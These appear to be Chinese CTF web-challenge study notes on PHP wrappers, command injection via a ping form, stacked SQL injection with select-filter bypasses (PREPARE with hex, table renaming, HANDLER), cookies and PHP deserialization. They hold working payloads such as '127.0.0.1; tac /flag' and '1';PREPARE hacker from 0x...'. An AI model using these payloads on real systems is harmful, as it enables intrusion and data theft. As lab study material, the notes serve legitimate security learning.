一，get post

1.GET传输**会在url中所体现的，所以我们就直接可以通过改变url来尝试。**

2.**碰到的是POST传输的话是需要通过HackBar或者[Burpsuite](https://so.csdn.net/so/search?q=Burpsuite&spm=1001.2101.3001.7020)将数据传递到服务器中。**

![img](https://img-blog.csdnimg.cn/1453a017fc384219952653043d4c69d3.png)

**GET传输  index.php?xxxx  或者  ？xxxx 都是GET请求的格式**

二，index.php

index.php是一种常见的文件命名约定，它通常用于表示一个PHP脚本文件，用于处理Web服务器上的HTTP请求。在许多网站中，index.php文件通常是网站的默认首页文件，当用户访问网站的根目录时，服务器会自动加载和执行index.php文件来生成网页内容。

index.php文件通常包含用于处理用户请求的PHP代码，包括从数据库中检索数据、生成动态内容、处理表单提交等。它可以与HTML、CSS、JavaScript等其他前端技术结合使用，以创建交互式和动态的网页。

总之，index.php是一个用于处理HTTP请求和生成动态网页内容的PHP脚本文件。
![image-20231020125006696](C:\Users\GAMING\AppData\Roaming\Typora\typora-user-images\image-20231020125006696.png)

三，使用类似的URL来进行文件读取和解码操作

在一些特定的应用场景中，可能会使用类似的URL来进行文件读取和解码操作。这种方式可以用于隐藏文件路径或对敏感信息进行保护。

1.所以我们使用

?file=//filter/read=convert.base64-decode/resource=flag.php
将 flag.php 文件的内容进行 Base64 编码，然后通过这个URL将编码后的内容传输给客户端，客户端再进行解码操作得到原始内容。



?file=//filter/read=convert.base64-decode/resource=index.php

2.获取源代码

使用php://input 是一个特殊的输入流，可以用来获取 HTTP 请求的原始请求体数据。

当使用 POST 方法提交表单或发送 JSON 数据等时，请求体中的数据会被传输到服务器。而 php://input 可以让开发者直接访问这些原始数据，而不需要依赖 PHP 的超全局变量 $_POST 或 $_REQUEST。

使用 php://input 可以在 PHP 脚本中以流的形式读取请求体数据。例如，可以使用以下代码来获取 POST 请求的原始数据：

$data = file_get_contents('php://input');
file_get_contents() 函数用于读取文件的内容，而 php://input 可以被看作是一个特殊的文件，用于读取请求体数据。

需要注意的是，php://input 是一个只读流，一旦读取完毕，就无法再次读取。另外，如果请求体数据是以表单形式提交的，可以使用 $_POST 来获取解析后的表单数据，而不需要使用 php://input。

总之，php://input 提供了一种直接访问 HTTP 请求体数据的方式，适用于需要自行处理请求体数据的情况

本题使用它会被过滤，因为源码里面使用了黑名单，如果是白名单include 直接包含文件了
三，命令漏洞输入

思路1.sql注入2.命令漏洞输入

本题考虑第二种

前言
php模拟我们常用的DOS命令ping命令的方法，主要用到的是php的内置函数exec来调用系统的ping命令,从而实现ping命令功能的。 从而想到通过exec函数来进行RCE

exec函数就是php执行系统命令，RCE就是利用漏洞

一，常见的命令执行漏洞输入指令
常见的命令注入漏洞输入指令有：

1. ;（分号）：用于分隔多个命令，攻击者可以在注入点后面添加恶意命令。

例如：`command; malicious_command`

2. &&（逻辑与）：用于在前一个命令成功执行后执行下一个命令，攻击者可以通过这种方式执行额外的命令。

例如：`command && malicious_command`

3. |（管道）：用于将前一个命令的输出作为后一个命令的输入，攻击者可以通过这种方式执行额外的命令。

例如：`command | malicious_command`

4. $(命令)：用于将命令的输出作为字符串嵌入到其他命令中，攻击者可以通过这种方式执行任意命令。

例如：`command $(malicious_command)`

5. `命令`：用于将命令的输出作为字符串嵌入到其他命令中，攻击者可以通过这种方式执行任意命令。

例如：`command `malicious_command``

;前面和后面命令都要执行，无论前面真假
|直接执行后面的语句
||如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句
&前面和后面命令都要执行，无论前面真假
&&如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令

这些是常见的命令注入漏洞输入指令，攻击者可以利用这些漏洞来执行任意的系统命令，可能导致敏感信息泄露、系统崩溃、权限提升等安全问题。因此，在开发和部署应用程序时，应该对用户输入进行严格的过滤和验证，以防止命令注入攻击。

二，实现指令
1.为什么使用命令执行漏洞指令
输入本地的地址，会发现有回显

![img](https://img-blog.csdnimg.cn/95faa4da3234492fa0dbafe9645b5037.png)

在这个例子里面，PING是返回网络状况的，但是本题将系统执行的结果放回，所以说明是命令执行漏洞

2.怎么操作
网站可能是Linux系统，利用命令执行代码里的

; ls /  的命令将文件列表输出，

![img](https://img-blog.csdnimg.cn/d186c38002914999ba3de57b9b07908e.png)

发现flag文件，执行命令，就可以得到flag

127.0.0.1; tac /flag

tac是一个Linux命令，用于反向输出文件内容,

反向输出是指将文件内容从最后一行开始逐行输出。通常，文件内容是从第一行开始逐行输出的，而反向输出则是从最后一行开始逐行输出
四，数据库注入

方法一：
1.首先启动并访问靶机，有一个输入框，随便输入1' or 1 = 1，测试一下是否存在sql注入。

2.提交后提示error 1064 : You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' at line 1，说明后端参数后面有可能存在其他sql语句，我们在1' or 1 = 1后面加一个#，将可能存在的其他sql语句注释掉，即：1' or 1 = 1#，成功输出了该表的所有数据，但是没有flag



3.既然存在sql注入，那么我们手动探测一下其他的表，首先判断一下字段个数：' union select 1,2;#，系统提示return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);，preg_match函数用于执行正则表达式，也就是说，系统通过该代码将select等关键字都过滤了。

4.既然select关键字无法使用，我们可以通过堆叠注入的方式，来绕过select关键字。

5.查看数据库名：1';show databases;#



6.查看数据表：1';show tables;#



7.我们先来看一下第一个表1919810931114514的表结构，有两种方式：

方式一：1'; show columns from tableName;#

方式二：1';desc tableName;#

注意，如果tableName是纯数字，需要用`包裹，比如1';desc `1919810931114514`;#

获取到字段名为flag：



8. 因为select关键字被过滤了，所以我们可以通过预编译的方式拼接select 关键字：1';PREPARE hacker from concat('s','elect', ' * from `1919810931114514` ');EXECUTE hacker;#得flag：flag{c0fc32ff-8ae1-4b96-8da0-1f621d7fdae3} （关于预编译的讲解请见下文）

方法二：
前几步和方法一一致，最后一步（第8步），我们可以直接将select * from `1919810931114514`语句进行16进制编码，即：73656c656374202a2066726f6d20603139313938313039333131313435313460，替换payload：

1';PREPARE hacker from 0x73656c656374202a2066726f6d20603139313938313039333131313435313460;EXECUTE hacker;#

同时，我们也可以先定义一个变量并将sql语句初始化，然后调用

1';Set @jia = 0x73656c656374202a2066726f6d20603139313938313039333131313435313460;PREPARE hacker from @jia;EXECUTE hacker;#

方法三
最后一步（第8步）也可以通过修改表名和列名来实现。我们输入1后，默认会显示id为1的数据，可以猜测默认显示的是words表的数据，查看words表结构第一个字段名为id我们把words表随便改成words1，然后把1919810931114514表改成words，再把列名flag改成id，就可以达到直接输出flag字段的值的效果：1'; alter table words rename to words1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(50);# ，然后通过1' or 1 = 1 #，成功获取到flag。 （关于更改表名的讲解请见下文）

方法四
此题还可以通过handle直接出答案：1';HANDLER `1919810931114514` OPEN;HANDLER `1919810931114514` READ FIRST;HANDLER `1919810931114514` CLOSE;

（关于的handle的讲解请见下文）

知识详解
1.预编译
预编译相当于定一个语句相同，参数不通的Mysql模板，我们可以通过预编译的方式，绕过特定的字符过滤

格式：

PREPARE 名称 FROM 	Sql语句 ? ;
SET @x=xx;
EXECUTE 名称 USING @x;
举例：查询ID为1的用户：

方法一：
SElECT * FROM t_user WHERE USER_ID = 1

方法二：
PREPARE jia FROM 'SElECT * FROM t_user WHERE USER_ID = 1';
EXECUTE jia;

方法三：
PREPARE jia FROM 'SELECT * FROM t_user WHERE USER_ID = ?';
SET @ID = 1;
EXECUTE jia USING @ID;

方法四：
SET @SQL='SElECT * FROM t_user WHERE USER_ID = 1';
PREPARE jia FROM @SQL;
EXECUTE jia;

2. 更改表名
   修改表名：ALTER TABLE 旧表名 RENAME TO 新表名；
   修改字段：ALTER TABLE 表名 CHANGE 旧字段名 新字段名 新数据类型；
   3.handle
   handle不是通用的SQL语句，是Mysql特有的，可以逐行浏览某个表中的数据，格式：
   打开表：
   HANDLER 表名 OPEN ;

查看数据：
HANDLER 表名 READ next;

关闭表：
HANDLER 表名 READ CLOSE;

五，roborts.txt

![image-20231020125955500](C:\Users\GAMING\AppData\Roaming\Typora\typora-user-images\image-20231020125955500.png)

六，PHP2

了解GET行参数的请求和url编码知识以及服务器的初次解码知识、了解phps文件

七，PHP反序列化漏洞：

执行unserialize()时，先会调用__wakeup()。

当序列化字符串中属性值个数大于属性个数，就会导致反序列化异常，从而跳过__wakeup()。

当对象被序列化时，它的内部状态会被保存为一个字符串。当对象被反序列化时，PHP会尝试将保存的字符串转换回对象。在这个过程中，会自动调用__wakeup()函数来对对象进行初始化。


通过将对象的数量从1变成6，可能会导致反序列化时的错误解析。这是因为PHP在反序列化时，会尝试将保存的字符串分配给对象的属性。如果对象的属性数量与保存的字符串中的数据不匹配，可能会导致解析错误或属性值被错误地赋值

八，burp suite暴破

九，掌握有关备份文件的知识

常见的备份文件后缀名有: `.git .svn .swp .svn .~ .bak .bash_history`

十，cookie

Cookie是当主机访问Web服务器时，由 Web 服务器创建的，将信息存储在用户计算机上的文件。一般网络用户习惯用其复数形式 Cookies，指某些网站为了辨别用户身份、进行 Session 跟踪而存储在用户本地终端上的数据，而这些数据通常会经过加密处理。

掌握有关cookie的知识，了解cookie所在位置

.浏览器按下F12键打开开发者工具，刷新后，在存储一栏，可看到名为look-here的cookie的值为cookie.php

2.访问`http://111.198.29.45:47911/cookie.php`，提示查看http响应包，在网络一栏，可看到访问cookie.php的数据包

3.点击查看数据包，在消息头内可发现flag

------------------------------------------

掌握web响应包头部常见参数

1.根据提示，在url中输入index.php,发现打开的仍然还是1.php

2.打开火狐浏览器的开发者模式，选择网络模块，再次请求index.php,查看返回包，可以看到location参数被设置了1.php，并且得到flag。

------------------------------------------------

魔法方法，就是系统在特定时刻自动调用的方法

魔术方法有一个共同点:系统自动调用，有两个不同点:调用的时间、调用之后产生的作用



#### _ _ call() 功能

在对象中调用一个不可访问方法时，__all()会被调用。

在静态上下文中调用一个不可访问方法时，__callStatic()会被调用

调用**某个实例化对象**中不存在、不可访问的方法时，PHP会调用__call()方法以处理错误调用，而不是抛错

$a -> ha(1,'z');

调用**未实例化的类**中不存在、不可访问的方法时，则调用__callStatic()

A::haha();

#### __toString()功能

__toString()是快速获取对象的[字符串](https://so.csdn.net/so/search?q=字符串&spm=1001.2101.3001.7020)信息的便捷方式

调用时间： 直接调用对象引用时自动调用，是当对象被当做字符串的时候会自动调用

看看这个对象都有哪些属性，其值是什么，如果类定义了toString方法，就能在测试时，echo打印对象体，对象就会自动调用它所属类定义的toString方法，格式化输出这个对象所包含的数据。

#### __invoke()功能

调用时间：当尝试以函数调用的方法调用对象时

当以函数的形式去调用对象（类）的时候传入的参数交由__invoke()管理也就是$obj()对应，并非交给__construct()方法。

#### __construct

调用时间：在一个类中定义一个方法作为构造函数。具有构造函数的类会在**每次创建新对象**时先调用此方法，所以**非常适合在使用对象之前做一些初始化工作**。

子父类调用

如果子类中定义了构造函数则不会隐式调用其父类的构造函数。要执行父类的构造函数，需要在子类的构造函数中调用 **parent::__construct()**。如果子类没有定义构造函数则会如同一个普通的类方法一样从父类继承

**highlight_file()**

函数是PHP中的一个内置函数，用于突出显示文件的语法。通过使用HTML标记突出显示语法。

![image-20231119121130154](C:\Users\GAMING\AppData\Roaming\Typora\typora-user-images\image-20231119121130154.png)

#### wakeup()

反序列化时调用

![image-20231119124950113](C:\Users\GAMING\AppData\Roaming\Typora\typora-user-images\image-20231119124950113.png)













**nssctf**

babyserilaize

"D:\typora\笔记\序列化.pdf"